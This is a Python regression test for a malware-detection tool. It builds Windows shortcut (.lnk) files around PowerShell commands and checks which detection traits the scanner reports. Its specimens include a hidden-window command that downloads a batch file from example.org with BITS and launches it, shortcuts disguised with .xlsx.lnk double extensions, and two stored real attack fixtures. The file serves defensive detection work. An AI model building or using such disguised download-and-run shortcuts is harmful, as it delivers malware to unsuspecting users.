#!/usr/bin/env python3
"""Static shortcut regression controls; never executes specimen commands."""
import argparse
import json
import lzma
import os
from pathlib import Path
import struct
import subprocess
import tempfile

ROOT = Path(__file__).resolve().parents[3]
LINK = 'micro-behaviors/process/deploy/file-exec::lnk-bits-temp-batch-launch'
PAYLOAD = 'objectives/execution/payload/file-exec::lnk-concealed-bits-batch-launch'
LURE = 'objectives/evasion/masquerade/extension/double::document-lnk-hidden-bits-stager'
START = 'metadata/lang/source/naming/action::lnk-start-process-command'
XLSX = 'metadata/file/extension/executable::lnk-xlsx-double-extension'
OLD = {'objectives/command-and-control/dropper/lnk/command-content::lnk-bits-transfer-remote-execute',
       'objectives/command-and-control/dropper/lnk/command-content::lnk-powershell-start-process',
       'objectives/evasion/masquerade/extension/double::lnk-name-xlsx-double'}


def shortcut(arguments, target='C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe'):
    header = struct.pack('<I16sIIQQQIIIHHII', 76,
        bytes.fromhex('0114020000000000C000000000000046'),
        0xa2, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0)
    path = target.encode('ascii') + b'\0'
    volume = struct.pack('<IIII', 17, 3, 0, 16) + b'\0'
    info = struct.pack('<IIIIIII', 46 + len(path), 28, 1, 28, 45, 0, 45 + len(path))
    return (header + info + volume + path + b'\0'
            + struct.pack('<H', len(arguments)) + arguments.encode('utf-16le') + bytes(4))


def main():
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument('--cleave', default=os.environ.get('CLEAVE', 'cleave'))
    parser.add_argument('--scratch', required=True, type=Path)
    args = parser.parse_args()
    cmd = ("Start-BitsTransfer -Source 'https://example.org/a.bat' "
           "-Destination $env:TEMP\\stage.bat; Start-Process $env:TEMP\\stage.bat")
    hidden = '-w hidden -c "' + cmd + '"'
    cases = {
        'download-only.lnk': (shortcut(cmd.split(';')[0]), set(), {LINK, PAYLOAD, LURE, START}),
        'unrelated-start.lnk': (shortcut(hidden.replace('Start-Process $env:TEMP\\stage.bat',
            'Start-Process $env:TEMP\\other.bat')), {START}, {LINK, PAYLOAD, LURE}),
        'normal-download-run.lnk': (shortcut(cmd), {LINK, START}, {PAYLOAD, LURE}),
        'hidden-download-run.xlsx.lnk': (shortcut(hidden), {LINK, PAYLOAD, LURE, START, XLSX}, set()),
        'renamed-stage.xlsx.lnk': (shortcut(hidden.replace('stage.bat', 'changed-name.bat')),
            {LINK, PAYLOAD, LURE}, set()),
        'case-variant.xlsx.lnk': (shortcut(hidden.replace('Start-Process $env:TEMP\\stage.bat',
            'Start-Process $ENV:temp\\STAGE.BAT')), {LINK, PAYLOAD, LURE}, set()),
        'upload-option.lnk': (shortcut(hidden.replace('Start-BitsTransfer',
            'Start-BitsTransfer -TransferType Upload')), {START}, {LINK, PAYLOAD, LURE}),
        'trailing-upload-option.lnk': (shortcut(hidden.replace('stage.bat; Start-Process',
            'stage.bat -TransferType Upload; Start-Process')), {START}, {LINK, PAYLOAD, LURE}),
        'suffix-mismatch.lnk': (shortcut(hidden.replace('Start-Process $env:TEMP\\stage.bat',
            'Start-Process $env:TEMP\\stage.bat.exe')), {START}, {LINK, PAYLOAD, LURE}),
        'notepad.lnk': (shortcut('-c "Start-Process notepad.exe"'), {START}, {LINK, PAYLOAD, LURE}),
        'spreadsheet.xlsx.lnk': (shortcut('', 'C:\\Documents\\report.xlsx'), {XLSX}, {LINK, PAYLOAD, LURE, START}),
        'hidden-exe-update.lnk': (shortcut(hidden.replace('.bat', '.exe')), {START}, {LINK, PAYLOAD, LURE}),
    }
    prior = {'objectives/evasion/masquerade/extension/double::document-lnk-powershell-bypass-hidden-lure'}
    for filename in ['invoice-statement.pdf.lnk.xz', 'Spisok_na_Zakupivlyu_INIT.xlsx.lnk.xz']:
        cases[filename[:-3]] = (lzma.decompress((ROOT/'testdata/hostile'/filename).read_bytes()), prior, set())
    args.scratch.mkdir(parents=True, exist_ok=True)
    with tempfile.TemporaryDirectory(dir=args.scratch) as tmp:
        for name, (content, _, _) in cases.items():
            (Path(tmp)/name).write_bytes(content)
        proc = subprocess.run([args.cleave, '--no-update-check', '--traits-dir', str(ROOT),
            '--format', 'json', tmp], cwd=ROOT, text=True, capture_output=True, check=True)
        remaining = proc.stdout.strip()
        decoder = json.JSONDecoder()
        found = {}
        while remaining:
            doc, consumed = decoder.raw_decode(remaining)
            remaining = remaining[consumed:].lstrip()
            for f in doc.get('files', [doc]):
                found[Path(f['path']).name] = {t['id']:t for t in f.get('traits', [])}
        for name, (_, wanted, forbidden) in cases.items():
            traits = found[name]
            assert not (wanted - traits.keys()), (name, 'missing', wanted - traits.keys())
            assert not ((forbidden | OLD) & traits.keys()), (name, 'unexpected', (forbidden | OLD) & traits.keys())
            for neutral in {START, XLSX, LINK} & traits.keys():
                assert traits[neutral]['crit'] == 3, (name, neutral, traits[neutral]['crit'])
        print(f'{len(cases)} shortcut controls passed, including two existing attack fixtures')


if __name__ == '__main__':
    main()
